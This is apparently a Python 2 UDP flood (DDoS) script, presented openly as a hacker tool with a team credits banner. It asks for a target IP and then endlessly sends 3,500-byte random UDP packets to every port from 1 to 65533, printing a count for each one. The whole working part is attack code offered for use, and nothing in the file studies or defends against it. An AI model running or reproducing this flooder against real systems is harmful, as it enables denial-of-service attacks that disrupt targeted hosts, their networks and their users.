#ahoorabm'
import socket, os, random, time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
print " ahoora"
print "                bm              "         
print "     3                    "
print " "
print "ddos-ahoora                  "
print " "
print " "
print " #ahoora"
print "#ddos           "
print "                                                             "
print "                              hacker-ddos                                    "
print "++++++++++++++++++++++++++++++++ +++++++++++++++++++++++ "
print 
print "["+B+""+R+"#"+N+"] "+B+""+R+"ddos"+N+"   dos - "+B+""+R+"Hacker"+N
print
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : white-eagle\033[0m")
print("\033[33msoroush 	       : @ahoorabm3")
print("\033[33mteam       : edalat-siah")
print("\033[32m================================================================\033[0m")
print

ip = raw_input("[+] ghrbani IP : ")
os.system("clear")
print "Attack starting...ahoorabm"
time.sleep(3)
while True:
	sent = 0
	for port in range(1, 65534):
    		white.sendto(bytes, (ip,port))
    		sent = sent + 1
    		print "\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s "%(sent, ip, port)

print "\033[1;92mAttack finished\033[0m"
